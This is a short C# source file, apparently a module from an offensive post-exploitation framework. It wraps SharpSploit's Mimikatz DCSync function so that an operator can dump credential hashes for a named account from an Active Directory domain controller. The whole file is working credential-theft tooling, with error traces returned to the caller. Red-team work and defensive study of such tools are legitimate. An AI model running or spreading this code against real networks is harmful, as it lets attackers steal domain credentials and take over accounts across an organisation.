using System;
using SharpSploit.Credentials;

namespace ExecSploit
{
    public static class DCSync
    {
        public static string Execute(string Username, string FQDN = "", string DC = "")
        {
            try
            {
                return SharpSploit.Credentials.Mimikatz.DCSync(Username, FQDN, DC);
            }
            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
        }
    }
}